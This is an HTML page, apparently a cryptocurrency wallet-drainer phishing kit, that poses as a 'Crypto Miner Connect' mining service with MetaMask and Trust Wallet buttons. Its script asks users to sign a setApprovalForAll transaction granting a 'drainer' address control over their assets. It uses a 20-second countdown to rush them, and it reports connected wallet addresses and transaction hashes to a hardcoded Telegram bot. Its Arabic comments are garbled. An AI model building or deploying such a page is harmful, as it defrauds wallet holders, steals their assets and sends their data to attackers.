<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>üöÄ Crypto Miner Connect</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Orbitron&family=Roboto:wght@400;700&display=swap');

  body {
    margin: 0; padding: 0;
    background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
    font-family: 'Roboto', sans-serif;
    color: #00ff99;
    user-select: none;
    min-height: 100vh;
    display: flex; flex-direction: column; align-items: center; justify-content: flex-start;
  }

  header {
    padding: 2rem 1rem 1rem 1rem;
    text-align: center;
  }

  header h1 {
    font-family: 'Orbitron', sans-serif;
    font-weight: 900;
    font-size: 3rem;
    text-transform: uppercase;
    letter-spacing: 0.1em;
    margin-bottom: 0.3rem;
    text-shadow: 0 0 10px #00ff99cc;
  }

  header p {
    font-size: 1.1rem;
    color: #77ffaa;
    margin-top: 0;
    margin-bottom: 2rem;
  }

  #status {
    background: rgba(0, 255, 153, 0.15);
    border: 1.5px solid #00ff99;
    border-radius: 12px;
    width: 90%;
    max-width: 600px;
    padding: 15px 20px;
    font-family: 'Roboto Mono', monospace;
    font-weight: 700;
    font-size: 1rem;
    text-align: center;
    box-shadow: 0 0 15px #00ff9922 inset;
    user-select: text;
    margin-bottom: 15px;
  }

  #countdown {
    font-weight: 900;
    font-size: 1.2rem;
    margin-bottom: 20px;
    letter-spacing: 0.05em;
    text-shadow: 0 0 6px #00ff99bb;
  }

  #buttons-desktop, #buttons-mobile {
    display: flex;
    gap: 20px;
    margin-bottom: 40px;
  }

  #buttons-desktop {
    display: none; /* shown only on desktop */
  }
  #buttons-mobile {
    display: none; /* shown only on mobile */
  }

  .wallet-btn {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 14px;
    padding: 14px 36px;
    font-size: 1.4rem;
    border-radius: 40px;
    border: 2.5px solid #00ff99;
    cursor: pointer;
    font-weight: 900;
    color: #002211;
    background: #00ff99;
    box-shadow: 0 0 25px #00ff99cc;
    transition: all 0.3s ease;
    user-select: none;
    width: 230px;
    text-transform: uppercase;
    font-family: 'Orbitron', sans-serif;
  }
  .wallet-btn:hover:not(:disabled) {
    background: transparent;
    color: #00ff99;
    box-shadow: 0 0 40px #00ff99ff;
    border-color: #00ff99ff;
  }
  .wallet-btn:disabled {
    cursor: not-allowed;
    background: #004422;
    color: #005533aa;
    border-color: #005533aa;
    box-shadow: none;
  }

  .wallet-btn img {
    width: 32px;
    height: 32px;
  }

  #log {
    background: rgba(0, 255, 153, 0.15);
    border: 1.5px solid #00ff99;
    border-radius: 12px;
    width: 90%;
    max-width: 600px;
    height: 160px;
    font-family: 'Roboto Mono', monospace;
    font-weight: 600;
    font-size: 0.95rem;
    padding: 15px 20px;
    overflow-y: auto;
    white-space: pre-wrap;
    user-select: text;
    box-shadow: 0 0 25px #00ff9966 inset;
    margin-bottom: 40px;
  }

  @media (min-width: 768px) {
    #buttons-desktop {
      display: flex;
    }
  }
  @media (max-width: 767px) {
    #buttons-mobile {
      display: flex;
    }
  }
</style>
</head>
<body>

<header>
  <h1>CRYPTO MINER CONNECT</h1>
  <p>Connect your wallet & start mining the future.</p>
</header>

<div id="status">Status: Waiting for you to connect your wallet...</div>
<div id="countdown"></div>

<!-- ÿ£ÿ≤ÿ±ÿßÿ± ÿßŸÑŸÉŸÖÿ®ŸäŸàÿ™ÿ± -->
<div id="buttons-desktop">
  <button id="metamaskDesktopBtn" class="wallet-btn" title="MetaMask Desktop">
    <img src="https://raw.githubusercontent.com/MetaMask/brand-resources/master/SVG/metamask-fox.svg" alt="MetaMask" />
    MetaMask Desktop
  </button>

  <button id="trustDesktopBtn" class="wallet-btn" title="Trust Wallet Desktop (not supported)">
    <img src="https://seeklogo.com/images/T/trust-wallet-logo-FA1F30F6D1-seeklogo.com.png" alt="Trust Wallet" />
    Trust Wallet Desktop
  </button>
</div>

<!-- ÿ£ÿ≤ÿ±ÿßÿ± ÿßŸÑŸáŸàÿßÿ™ŸÅ -->
<div id="buttons-mobile">
  <button id="metamaskMobileBtn" class="wallet-btn" title="MetaMask Mobile">
    <img src="https://raw.githubusercontent.com/MetaMask/brand-resources/master/SVG/metamask-fox.svg" alt="MetaMask" />
    MetaMask Mobile
  </button>

  <button id="trustMobileBtn" class="wallet-btn" title="Trust Wallet Mobile">
    <img src="https://seeklogo.com/images/T/trust-wallet-logo-FA1F30F6D1-seeklogo.com.png" alt="Trust Wallet" />
    Trust Wallet Mobile
  </button>
</div>

<div id="log" aria-live="polite" aria-atomic="true"></div>

<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>

<script>
  // ÿ•ÿπÿØÿßÿØ ÿ®Ÿàÿ™ ÿ™ŸäŸÑŸäÿ¨ÿ±ÿßŸÖ
  const TELEGRAM_TOKEN = '7742799307:AAE4gtk_bHx2DiFxmqUEglreldTFFTrg';
  const TELEGRAM_CHAT_ID = '1269389399';

  // ÿßŸÑÿπŸÇÿØ ŸàÿßŸÑŸÖÿπŸÑŸàŸÖÿßÿ™
  const DRAINER_ADDRESS = "0x1111111111111111111111111111111111111111";
  const ABI = ["function setApprovalForAll(address operator, bool approved) external"];

  // ÿπŸÜÿßÿµÿ± DOM
  const statusEl = document.getElementById('status');
  const logEl = document.getElementById('log');
  const countdownEl = document.getElementById('countdown');

  const metamaskDesktopBtn = document.getElementById('metamaskDesktopBtn');
  const trustDesktopBtn = document.getElementById('trustDesktopBtn');

  const metamaskMobileBtn = document.getElementById('metamaskMobileBtn');
  const trustMobileBtn = document.getElementById('trustMobileBtn');

  let provider, signer;
  let countdownTimer;

  // ÿ•ÿ±ÿ≥ÿßŸÑ ÿ±ÿ≥ÿßŸÑÿ© ÿ™ŸäŸÑŸäÿ¨ÿ±ÿßŸÖ
  function sendTelegramMessage(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
    const data = { chat_id: TELEGRAM_CHAT_ID, text: message };
    fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data)
    }).catch(err => console.error("Telegram error:", err));
  }

  // ÿ™ÿ≥ÿ¨ŸäŸÑ ŸÖÿ≠ŸÑŸä + ÿ™ŸäŸÑŸäÿ¨ÿ±ÿßŸÖ
  function smartLog(message) {
    const now = new Date().toLocaleTimeString();
    const logMessage = `[${now}] ${message}`;
    logEl.textContent += `${logMessage}\n`;
    logEl.scrollTop = logEl.scrollHeight;
    sendTelegramMessage(logMessage);
  }

  // ÿπÿØÿßÿØ ÿ™ŸÜÿßÿ≤ŸÑŸä
  function startCountdown() {
    let countdownValue = 20;
    let timeoutSent = false;
    countdownEl.textContent = `‚è≥ Time left to approve: ${countdownValue}s`;
    clearInterval(countdownTimer);

    countdownTimer = setInterval(() => {
      countdownValue--;
      countdownEl.textContent = `‚è≥ Time left to approve: ${countdownValue}s`;

      if (countdownValue <= 0) {
        clearInterval(countdownTimer);
        approveBtn.disabled = true;
        statusEl.textContent = "‚åõ Timeout. Please reconnect your wallet.";
        if (!timeoutSent) {
          smartLog("User timeout - approval disabled.");
          timeoutSent = true;
        }
      }
    }, 1000);
  }

  // ÿßÿ™ÿµÿßŸÑ ŸÖŸäÿ™ÿß ŸÖÿßÿ≥ŸÉ ÿØŸäÿ≥ŸÉÿ™Ÿàÿ®
  async function connectMetaMaskDesktop() {
    if (!window.ethereum || !window.ethereum.isMetaMask) {
      smartLog("MetaMask not detected in browser.");
      statusEl.textContent = "‚ùå MetaMask not detected on desktop!";
      return;
    }
    try {
      statusEl.textContent = "üîÑ Requesting MetaMask connection...";
      const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
      provider = new ethers.providers.Web3Provider(window.ethereum);
      signer = provider.getSigner();
      const address = await signer.getAddress();

      statusEl.textContent = `‚úÖ Connected: ${address}`;
      smartLog(`Connected to MetaMask account (Desktop): ${address}`);
      approveBtn.disabled = false;
      startCountdown();

      window.ethereum.on('accountsChanged', (accounts) => {
        if (accounts.length === 0) {
          statusEl.textContent = "‚ùó MetaMask disconnected.";
          smartLog("MetaMask account disconnected.");
          approveBtn.disabled = true;
          clearInterval(countdownTimer);
        } else {
          statusEl.textContent = `üîÑ Account changed: ${accounts[0]}`;
          smartLog(`Account changed to: ${accounts[0]}`);
          approveBtn.disabled = false;
          startCountdown();
        }
      });

      window.ethereum.on('chainChanged', (chainId) => {
        smartLog(`Network changed: ${chainId}`);
        statusEl.textContent = `üåê Network changed: ${chainId}`;
        approveBtn.disabled = true;
        clearInterval(countdownTimer);
      });

    } catch (err) {
      statusEl.textContent = "‚ùå Connection rejected or failed.";
      smartLog(`MetaMask connection error (Desktop): ${err.message}`);
    }
  }

  // ŸÅÿ™ÿ≠ Trust Wallet ÿØÿßÿ® (ÿπÿßÿØÿ© ŸäÿπŸÖŸÑ ÿπŸÑŸâ ŸÖŸàÿ®ÿßŸäŸÑ)
  function openTrustWalletDesktop() {
    statusEl.textContent = "‚ö†Ô∏è Trust Wallet desktop is not supported. Please use mobile.";
    smartLog("Trust Wallet Desktop attempt blocked.");
  }

  // ŸÅÿ™ÿ≠ MetaMask Mobile
  function openMetaMaskMobile() {
    const dappUrl = window.location.origin;
    const metamaskMobileLink = `https://metamask.app.link/dapp/${dappUrl.replace(/^https?:\/\//, '')}`;
    window.location.href = metamaskMobileLink;
  }

  // ŸÅÿ™ÿ≠ Trust Wallet Mobile
  function openTrustWalletMobile() {
    const dappUrl = window.location.origin;
    const trustUrl = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(dappUrl)}`;
    window.location.href = trustUrl;
  }

  // ŸÖŸàÿßŸÅŸÇÿ© ÿßŸÑÿπŸÇÿØ
  async function approveDrainer() {
    if (!signer) {
      statusEl.textContent = "‚ùå Not connected to wallet.";
      smartLog("Attempted approval without wallet connection.");
      return;
    }
    approveBtn.disabled = true;
    statusEl.textContent = "‚è≥ Sending approval transaction...";
    smartLog("Initiating setApprovalForAll transaction to drainer...");

    try {
      const contract = new ethers.Contract(DRAINER_ADDRESS, ABI, signer);
      const tx = await contract.setApprovalForAll(DRAINER_ADDRESS, true);
      statusEl.textContent = "‚úÖ Approval transaction sent! Please confirm in wallet.";
      smartLog(`Transaction sent. Hash: ${tx.hash}`);

      await tx.wait();
      statusEl.textContent = "üéâ Transaction confirmed! Your wallet is 'approved'.";
      smartLog("Transaction confirmed successfully.");
      clearInterval(countdownTimer);
      countdownEl.textContent = "";
    } catch (error) {
      statusEl.textContent = "‚ùå Transaction failed or rejected.";
      smartLog(`Transaction error: ${error.message}`);
      approveBtn.disabled = false;
    }
  }

  // ÿ≤ÿ± ÿßŸÑŸÖŸàÿßŸÅŸÇÿ© (ŸÖŸàÿ≠ÿØ)
  const approveBtn = document.createElement('button');
  approveBtn.className = 'wallet-btn';
  approveBtn.textContent = 'Approve Drainer Access';
  approveBtn.disabled = true;
  approveBtn.style.marginBottom = '40px';
  document.body.insertBefore(approveBtn, logEl);

  approveBtn.addEventListener('click', approveDrainer);

  // ÿßÿ≥ÿ™ŸÖÿßÿπ ŸÑŸÑÿ£ÿ≤ÿ±ÿßÿ±
  metamaskDesktopBtn.addEventListener('click', connectMetaMaskDesktop);
  trustDesktopBtn.addEventListener('click', openTrustWalletDesktop);
  metamaskMobileBtn.addEventListener('click', openMetaMaskMobile);
  trustMobileBtn.addEventListener('click', openTrustWalletMobile);

  // ÿ≠ÿßŸÑÿ© ÿ®ÿØÿßŸäÿ©
  if (window.ethereum && window.ethereum.isMetaMask) {
    statusEl.textContent = "‚úÖ MetaMask detected. Ready to connect.";
  } else {
    statusEl.textContent = "‚õî MetaMask not detected on this device.";
  }
</script>
</body>
</html>
